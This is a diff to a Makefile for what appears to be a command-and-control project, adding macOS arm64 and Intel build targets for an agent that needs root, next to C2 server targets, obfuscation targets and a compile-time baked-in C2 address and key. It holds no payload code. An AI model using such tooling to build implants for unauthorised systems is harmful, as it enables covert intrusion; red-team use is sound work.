@@ -1,4 +1,4 @@
-.PHONY: all client server tools clean dist garble-client garble-server
+.PHONY: all client server agent-darwin agent-darwin-amd64 tools clean dist garble-client garble-server
 
 # ─── compiler flags ────────────────────────────────────────────────────────────
 GOFLAGS   := -trimpath
@@ -25,6 +25,16 @@ client: dist
 # Build Linux amd64 C2 server
 server: dist
 	GOOS=linux GOARCH=amd64 go build $(GOFLAGS) -ldflags "$(LDFLAGS)" -o $(OUT_SERVER) ./cmd/server
+
+# Build macOS arm64 agent (Apple Silicon) — requires root at runtime
+OUT_AGENT_DARWIN_ARM64 := dist/agent-darwin-arm64
+agent-darwin: dist
+	GOOS=darwin GOARCH=arm64 go build $(GOFLAGS) -ldflags "$(LDFLAGS)" -o $(OUT_AGENT_DARWIN_ARM64) ./cmd/client
+
+# Build macOS amd64 agent (Intel Mac) — requires root at runtime
+OUT_AGENT_DARWIN_AMD64 := dist/agent-darwin-amd64
+agent-darwin-amd64: dist
+	GOOS=darwin GOARCH=amd64 go build $(GOFLAGS) -ldflags "$(LDFLAGS)" -o $(OUT_AGENT_DARWIN_AMD64) ./cmd/client
 
 # ─── custom C2 address baked in at compile time ─────────────────────────────────
 # Usage: make client-baked C2=2001:db8::1 SPORT=1080 POLL=50 PSK=mysecret
